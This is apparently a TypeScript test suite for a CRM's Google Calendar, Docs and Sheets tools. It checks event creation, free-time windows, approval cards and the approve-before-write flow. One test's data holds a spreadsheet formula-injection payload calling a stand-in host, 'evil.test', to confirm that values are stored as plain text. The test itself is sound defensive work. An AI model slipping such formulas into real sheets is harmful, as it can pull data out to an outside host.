import { describe, expect, test } from "bun:test";
import { calendarEventPreview, docsPreview, prettyTime } from "../src/crm/approvals/workspace-previews";
import { CALENDAR_HANDLERS, freeWindows, zonedToUtc } from "../src/google/rest-calendar";
import { DOCS_HANDLERS, docRequests, sheetRows } from "../src/google/rest-docs";
import { RestRefused } from "../src/google/rest-shared";

const json = (body: unknown, status = 200) => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });

interface Req {
  url: URL;
  method: string;
  body: any;
}

function google(routes: (r: Req) => Response | undefined) {
  const sent: Req[] = [];
  const fetchImpl = (async (url: string, init: any = {}) => {
    const r: Req = { url: new URL(url), method: init.method ?? "GET", body: init.body ? JSON.parse(init.body) : undefined };
    sent.push(r);
    return routes(r) ?? new Response("not found", { status: 404 });
  }) as unknown as typeof fetch;
  return { sent, fetchImpl, o: { token: "at-1", timeoutMs: 5_000, fetchImpl } };
}

const call = (handlers: Record<string, (a: any, o: any) => Promise<any>>, name: string, args: object, o: object) =>
  handlers[name]!(args, o).catch((e: unknown) => (e instanceof RestRefused ? { refused: e.message } : Promise.reject(e)));

describe("Calendar over REST", () => {
  test("list_events defaults to the next 7 days on the primary calendar and accepts MCP-style argument names", async () => {
    const { sent, o } = google((r) =>
      r.url.pathname === "/calendar/v3/calendars/primary/events"
        ? json({ timeZone: "Australia/Melbourne", items: [{ id: "ev1", summary: "Priya intake", start: { dateTime: "2026-10-02T15:00:00+10:00" }, end: { dateTime: "2026-10-02T15:30:00+10:00" }, htmlLink: "https://calendar.google.com/calendar/event?eid=abc", attendees: [{ email: "priya@x.test", responseStatus: "accepted" }] }, { id: "gone", status: "cancelled" }] })
        : undefined,
    );
    const out = await call(CALENDAR_HANDLERS, "list_events", { startTime: "2026-10-02T00:00:00Z" }, o);
    const q = sent[0]!.url.searchParams;
    expect(q.get("singleEvents")).toBe("true");
    expect(q.get("orderBy")).toBe("startTime");
    expect(q.get("timeMin")).toBe("2026-10-02T00:00:00Z");
    expect(q.get("timeMax")).toBe("2026-10-09T00:00:00.000Z");
    expect(out.text).toContain("Priya intake");
    expect(out.text).toContain("with priya@x.test");
    expect(out.structured.events).toHaveLength(1);
    expect(out.structured.events[0].htmlLink).toBe("https://calendar.google.com/calendar/event?eid=abc");
  });

  test("search_events needs words to search for", async () => {
    const { o } = google(() => undefined);
    expect(await call(CALENDAR_HANDLERS, "search_events", {}, o)).toEqual({ refused: "query is required" });
  });

  test("create_event emails invites when there are attendees and asks for Meet when requested", async () => {
    const { sent, o } = google((r) => {
      if (r.url.pathname === "/calendar/v3/calendars/primary" ) return json({ timeZone: "Australia/Melbourne" });
      if (r.method === "POST" && r.url.pathname === "/calendar/v3/calendars/primary/events") return json({ id: "new1", summary: r.body.summary, htmlLink: "https://calendar.google.com/calendar/event?eid=new1", start: r.body.start, end: r.body.end, attendees: r.body.attendees });
    });
    const out = await call(CALENDAR_HANDLERS, "create_event", { summary: "Visa check-in", start: "2026-10-02T15:00:00", end: "2026-10-02T15:30:00", attendees: ["Priya <priya@x.test>"], addGoogleMeet: true }, o);
    const post = sent.find((r) => r.method === "POST")!;
    expect(post.url.searchParams.get("sendUpdates")).toBe("all");
    expect(post.url.searchParams.get("conferenceDataVersion")).toBe("1");
    // A wall-clock time without an offset is booked in the calendar's own zone.
    expect(post.body.start).toEqual({ dateTime: "2026-10-02T15:00:00", timeZone: "Australia/Melbourne" });
    expect(post.body.attendees).toEqual([{ email: "priya@x.test" }]);
    expect(post.body.conferenceData.createRequest.conferenceSolutionKey.type).toBe("hangoutsMeet");
    expect(out.text).toContain("invites to priya@x.test");
  });

  test("create_event without attendees sends nobody anything", async () => {
    const { sent, o } = google((r) => (r.method === "POST" ? json({ id: "n2" }) : undefined));
    await call(CALENDAR_HANDLERS, "create_event", { summary: "Focus time", start: "2026-10-02", end: "2026-10-03" }, o);
    expect(sent[0]!.url.searchParams.get("sendUpdates")).toBe("none");
    expect(sent[0]!.body.start).toEqual({ date: "2026-10-02" });
  });

  test("create_event refuses a bad attendee address", async () => {
    const { sent, o } = google(() => undefined);
    const out = await call(CALENDAR_HANDLERS, "create_event", { summary: "x", start: "2026-10-02T15:00:00Z", end: "2026-10-02T16:00:00Z", attendees: ["not-an-email"] }, o);
    expect(out.refused).toContain("not an email address");
    expect(sent).toHaveLength(0);
  });

  test("free windows sit inside 09:00–17:00 on weekdays in the calendar's zone and around busy blocks", () => {
    const tz = "Australia/Melbourne";
    // Thu 1 Oct 2026 08:00 → Mon 5 Oct 2026 00:00, Melbourne time.
    const from = zonedToUtc(2026, 10, 1, 8, 0, tz);
    const to = zonedToUtc(2026, 10, 5, 0, 0, tz);
    const busy = [{ start: zonedToUtc(2026, 10, 1, 10, 0, tz), end: zonedToUtc(2026, 10, 1, 16, 30, tz) }];
    const w = freeWindows(busy, from, to, 30 * 60_000, tz);
    expect(w[0]).toEqual({ start: zonedToUtc(2026, 10, 1, 9, 0, tz), end: zonedToUtc(2026, 10, 1, 10, 0, tz) });
    expect(w[1]).toEqual({ start: zonedToUtc(2026, 10, 1, 16, 30, tz), end: zonedToUtc(2026, 10, 1, 17, 0, tz) });
    expect(w[2]).toEqual({ start: zonedToUtc(2026, 10, 2, 9, 0, tz), end: zonedToUtc(2026, 10, 2, 17, 0, tz) });
    // Saturday and Sunday are skipped.
    expect(w).toHaveLength(3);
  });

  test("zonedToUtc handles a DST change day", () => {
    // Melbourne moves to AEDT (+11) on Sun 4 Oct 2026 at 02:00.
    expect(new Date(zonedToUtc(2026, 10, 5, 9, 0, "Australia/Melbourne")).toISOString()).toBe("2026-10-04T22:00:00.000Z");
    expect(new Date(zonedToUtc(2026, 10, 2, 9, 0, "Australia/Melbourne")).toISOString()).toBe("2026-10-01T23:00:00.000Z");
  });
});

describe("Docs and Sheets over REST", () => {
  test("a Doc's headings and bullets become paragraph styles at the right indexes", () => {
    const req = docRequests("# Plan\nIntro\n- one\n## Next");
    expect(req[0]).toEqual({ insertText: { location: { index: 1 }, text: "Plan\nIntro\none\nNext" } });
    expect(req).toContainEqual({ updateParagraphStyle: { range: { startIndex: 1, endIndex: 6 }, paragraphStyle: { namedStyleType: "HEADING_1" }, fields: "namedStyleType" } });
    expect(req).toContainEqual({ createParagraphBullets: { range: { startIndex: 12, endIndex: 16 }, bulletPreset: "BULLET_DISC_CIRCLE_SQUARE" } });
    expect(req).toContainEqual({ updateParagraphStyle: { range: { startIndex: 16, endIndex: 21 }, paragraphStyle: { namedStyleType: "HEADING_2" }, fields: "namedStyleType" } });
  });

  test("create_doc creates the document, fills it, and never shares it", async () => {
    const { sent, o } = google((r) => {
      if (r.method === "POST" && r.url.pathname === "/v1/documents") return json({ documentId: "doc1" });
      if (r.url.pathname === "/v1/documents/doc1:batchUpdate") return json({});
    });
    const out = await call(DOCS_HANDLERS, "create_doc", { title: "GTE outline", content: "# Background\n- studied at X" }, o);
    expect(sent.map((r) => `${r.method} ${r.url.pathname}`)).toEqual(["POST /v1/documents", "POST /v1/documents/doc1:batchUpdate"]);
    expect(sent.some((r) => /permissions/.test(r.url.pathname))).toBe(false);
    expect(out.structured).toEqual({ id: "doc1", title: "GTE outline", webViewLink: "https://docs.google.com/document/d/doc1/edit" });
  });

  test("create_sheet writes RAW values, so a formula copied from an email stays text", async () => {
    const { sent, o } = google((r) => {
      if (r.method === "POST" && r.url.pathname === "/v4/spreadsheets") return json({ spreadsheetId: "sh1", spreadsheetUrl: "https://docs.google.com/spreadsheets/d/sh1/edit", sheets: [{ properties: { sheetId: 7 } }] });
      if (r.method === "PUT") return json({});
      if (r.url.pathname === "/v4/spreadsheets/sh1:batchUpdate") return json({});
    });
    const out = await call(DOCS_HANDLERS, "create_sheet", { title: "Monash options", rows: [["Course", "Fee"], ["MIT", 48000], ['=IMPORTXML("https://evil.test","//a")', null]] }, o);
    const put = sent.find((r) => r.method === "PUT")!;
    expect(put.url.searchParams.get("valueInputOption")).toBe("RAW");
    expect(put.body.values).toEqual([["Course", "Fee"], ["MIT", "48000"], ['=IMPORTXML("https://evil.test","//a")', ""]]);
    const batch = sent.find((r) => r.url.pathname.endsWith(":batchUpdate"))!;
    expect(batch.body.requests[0].repeatCell.range.sheetId).toBe(7);
    expect(sent.some((r) => /permissions/.test(r.url.pathname))).toBe(false);
    expect(out.structured.webViewLink).toBe("https://docs.google.com/spreadsheets/d/sh1/edit");
  });

  test("sheet rows are bounded and an empty table is refused", () => {
    expect(sheetRows(Array.from({ length: 900 }, () => Array.from({ length: 40 }, () => "x")))).toHaveLength(500);
    expect(sheetRows([Array.from({ length: 40 }, () => "x")])[0]).toHaveLength(26);
    expect(() => sheetRows([[""], [" "]])).toThrow(RestRefused);
    expect(() => sheetRows("a,b")).toThrow(RestRefused);
  });
});

describe("approval previews", () => {
  test("a calendar card names who gets an invite and shows the time as written", () => {
    const r = calendarEventPreview("calendar_create_event", { summary: "Visa check-in", start: "2026-10-02T15:00:00", end: "2026-10-02T15:30:00", attendees: ["priya@x.test"], addGoogleMeet: true, location: "Office" });
    expect(r.ok).toBe(true);
    if (!r.ok) return;
    expect(r.preview.target).toEqual({ entity: "calendarEvent", id: null, label: "Visa check-in" });
    expect(r.preview.changes.map((c) => [c.label, c.after])).toEqual([
      ["Title", "Visa check-in"],
      ["Starts", "Fri 2 Oct 2026, 15:00"],
      ["Ends", "Fri 2 Oct 2026, 15:30"],
      ["Time zone", "Your calendar's time zone"],
      ["Invites emailed to", "priya@x.test"],
      ["Location", "Office"],
      ["Google Meet", "Yes"],
    ]);
  });

  test("a calendar card refuses an event that ends before it starts, mixed forms, and bad attendees", () => {
    expect(calendarEventPreview("t", { summary: "x", start: "2026-10-02T15:00:00Z", end: "2026-10-02T14:00:00Z" })).toEqual({ ok: false, error: "the event must end after it starts" });
    expect(calendarEventPreview("t", { summary: "x", start: "2026-10-02", end: "2026-10-02T14:00:00Z" }).ok).toBe(false);
    expect(calendarEventPreview("t", { summary: "x", start: "2026-10-02T15:00:00Z", end: "2026-10-02T16:00:00Z", attendees: ["bob"] }).ok).toBe(false);
    expect(calendarEventPreview("t", { start: "2026-10-02T15:00:00Z", end: "2026-10-02T16:00:00Z" }).ok).toBe(false);
  });

  test("prettyTime keeps the wall clock and shows an explicit offset", () => {
    expect(prettyTime("2026-10-02")).toBe("Fri 2 Oct 2026 (all day)");
    expect(prettyTime("2026-10-02T09:05:00+10:00")).toBe("Fri 2 Oct 2026, 09:05 (UTC+10:00)");
    expect(prettyTime("2026-10-02T09:05:00Z")).toBe("Fri 2 Oct 2026, 09:05 (UTC)");
  });

  test("a Doc card shows its type, title and content; a Sheet card its size and a TSV preview", () => {
    const doc = docsPreview("docs_create_doc", { title: "GTE outline", content: "# Background\n* studied at X" });
    expect(doc.ok && doc.preview.changes.map((c) => [c.label, c.after])).toEqual([
      ["Type", "Google Doc"],
      ["Title", "GTE outline"],
      ["Content", "# Background\n- studied at X"],
    ]);
    const sheet = docsPreview("docs_create_sheet", { title: "Options", rows: [["Course", "Fee"], ["MIT\tnight", 48000]] });
    expect(sheet.ok && sheet.preview.target.entity).toBe("googleSheet");
    expect(sheet.ok && sheet.preview.changes.map((c) => [c.label, c.after])).toEqual([
      ["Type", "Google Sheet"],
      ["Title", "Options"],
      ["Rows", "2 rows × 2 columns"],
      ["Preview", "Course\tFee\nMIT night\t48000"],
    ]);
    expect(docsPreview("docs_create_doc", { title: "x", content: " " }).ok).toBe(false);
    expect(docsPreview("docs_create_sheet", { rows: [["a"]] }).ok).toBe(false);
  });
});

describe("Calendar and Docs proposals through approval", () => {
  const { CrmWriteService } = require("../src/crm/approvals/service") as typeof import("../src/crm/approvals/service");
  const { InMemoryCrmWriteProposalStore } = require("../src/crm/approvals/store") as typeof import("../src/crm/approvals/store");
  const { createLogger } = require("../src/observability/logger") as typeof import("../src/observability/logger");
  const { decisionNote } = require("../src/crm/approvals/history") as typeof import("../src/crm/approvals/history");
  const JANE = "jane@heubert.com";

  function setup(service: "calendar" | "docs", result: object) {
    const calls: { name: string; args: unknown }[] = [];
    const toolset = {
      actor: JANE,
      descriptors: [{ name: service === "calendar" ? "calendar_create_event" : "docs_create_sheet", description: "", inputSchema: { type: "object", properties: {} } as never, annotations: { readOnlyHint: false } }],
      call: async (name: string, args: Record<string, unknown>) => {
        calls.push({ name, args });
        return { text: "ok", isError: false, structured: result as Record<string, unknown> };
      },
      refresh: async () => {},
    };
    const status = { gmail: "not_connected", drive: "not_connected", calendar: "not_connected", docs: "not_connected" } as const;
    const state = { connected: true };
    const workspace = { forActor: async () => (state.connected ? { [service]: toolset, status: { ...status, [service]: "connected" } } : { status }), forget: () => {} };
    let n = 0;
    const svc = new CrmWriteService({ store: new InMemoryCrmWriteProposalStore(), logger: createLogger({ test: true }), newId: () => `p${++n}`, workspace: workspace as never });
    return { svc, toolset, calls, state };
  }

  test("an approved calendar event is created once and links to the event", async () => {
    const x = setup("calendar", { id: "ev9", htmlLink: "https://calendar.google.com/calendar/event?eid=ev9" });
    const args = { summary: "Visa check-in", start: "2026-10-02T15:00:00Z", end: "2026-10-02T15:30:00Z", attendees: ["priya@x.test"] };
    const r = await x.svc.proposeWorkspace({ service: "calendar", sessionId: "s1", requestId: "r1", toolset: x.toolset as never, tool: "calendar_create_event", args });
    if (!r.ok) throw new Error(r.error);
    expect(r.view.provider).toBe("calendar");
    expect(x.calls).toHaveLength(0); // proposing calls nothing

    const [a, b] = await Promise.all([
      x.svc.decide({ proposalId: r.view.proposalId, actorEmail: JANE, decision: "approve" }),
      x.svc.decide({ proposalId: r.view.proposalId, actorEmail: JANE, decision: "approve" }),
    ]);
    expect(x.calls).toHaveLength(1);
    expect(x.calls[0]!.args).toEqual(args);
    const ok = [a, b].find((d) => d.kind === "ok")!;
    expect(ok.kind === "ok" && ok.view).toMatchObject({ status: "applied", result: { id: "ev9", link: "https://calendar.google.com/calendar/event?eid=ev9" } });
    expect(ok.kind === "ok" && decisionNote([ok.view])).toContain("added to their calendar");
  });

  test("a bad event is refused at propose time, and a revoked connection fails the approve", async () => {
    const x = setup("calendar", {});
    expect(await x.svc.proposeWorkspace({ service: "calendar", sessionId: "s1", requestId: "r1", toolset: x.toolset as never, tool: "calendar_create_event", args: { summary: "x", start: "2026-10-02T15:00:00Z", end: "2026-10-02T14:00:00Z" } })).toEqual({ ok: false, error: "the event must end after it starts" });

    const r = await x.svc.proposeWorkspace({ service: "calendar", sessionId: "s1", requestId: "r1", toolset: x.toolset as never, tool: "calendar_create_event", args: { summary: "x", start: "2026-10-02T15:00:00Z", end: "2026-10-02T16:00:00Z" } });
    if (!r.ok) throw new Error(r.error);
    x.state.connected = false;
    const d = await x.svc.decide({ proposalId: r.view.proposalId, actorEmail: JANE, decision: "approve" });
    expect(d.kind === "ok" && d.view).toMatchObject({ status: "failed", error: "Google Calendar is no longer connected" });
    expect(x.calls).toHaveLength(0);
  });

  test("an approved Sheet links to the new file", async () => {
    const x = setup("docs", { id: "sh1", webViewLink: "https://docs.google.com/spreadsheets/d/sh1/edit" });
    const r = await x.svc.proposeWorkspace({ service: "docs", sessionId: "s1", requestId: "r1", toolset: x.toolset as never, tool: "docs_create_sheet", args: { title: "Options", rows: [["Course"], ["MIT"]] } });
    if (!r.ok) throw new Error(r.error);
    expect(r.view.target.entity).toBe("googleSheet");
    const d = await x.svc.decide({ proposalId: r.view.proposalId, actorEmail: JANE, decision: "approve" });
    expect(d.kind === "ok" && d.view.result).toEqual({ id: "sh1", link: "https://docs.google.com/spreadsheets/d/sh1/edit" });
  });
});

describe("provider: Calendar and Docs routing", () => {
  const { createWorkspaceProvider } = require("../src/google/provider") as typeof import("../src/google/provider");
  const tokens = { accessToken: async () => ({ ok: true as const, token: "at-1", services: ["calendar", "docs"] as ("calendar" | "docs")[] }), invalidate: () => {} };

  test("Docs never touches an MCP server; writes are offered only when switched on and always run over REST", async () => {
    const { sent, fetchImpl } = google((r) => {
      if (r.url.hostname === "calendarmcp.example.test") {
        if (r.body?.id === undefined) return new Response(null, { status: 202 });
        const tools = [{ name: "list_events", description: "list", inputSchema: { type: "object", properties: {} }, annotations: { readOnlyHint: true } }, { name: "create_event", description: "mcp create", inputSchema: { type: "object", properties: {} } }];
        return json({ jsonrpc: "2.0", id: r.body.id, result: r.body.method === "tools/list" ? { tools } : {} });
      }
      if (r.method === "POST" && r.url.pathname === "/calendar/v3/calendars/primary/events") return json({ id: "e1", htmlLink: "https://calendar.google.com/calendar/event?eid=e1" });
    });
    const p = createWorkspaceProvider({ tokens, gmailUrl: "https://gmailmcp.example.test/mcp/v1", driveUrl: "https://drivemcp.example.test/mcp/v1", calendarUrl: "https://calendarmcp.example.test/mcp/v1", timeoutMs: 5_000, allowWrites: { calendar: true }, fetchImpl });
    const out = await p.forActor("jane@heubert.com");
    expect(out.status).toMatchObject({ calendar: "connected", docs: "connected" });
    expect(out.docs).toBeUndefined(); // connected, but creation is switched off: nothing offered
    // list_events from MCP; the other reads from REST; create_event from REST although MCP lists it.
    expect(out.calendar!.descriptors.map((d) => d.name)).toEqual(["calendar_list_events", "calendar_search_events", "calendar_get_event", "calendar_list_calendars", "calendar_suggest_time", "calendar_create_event"]);
    expect(out.calendar!.descriptors.find((d) => d.name === "calendar_create_event")!.description).not.toBe("mcp create");
    await out.calendar!.call("calendar_create_event", { summary: "x", start: "2026-10-02T15:00:00Z", end: "2026-10-02T16:00:00Z" });
    expect(sent.some((r) => r.url.pathname === "/calendar/v3/calendars/primary/events" && r.method === "POST")).toBe(true);
    expect(sent.some((r) => r.body?.method === "tools/call")).toBe(false);
    expect(sent.some((r) => /docs|sheets/.test(r.url.hostname))).toBe(false);
  });
});
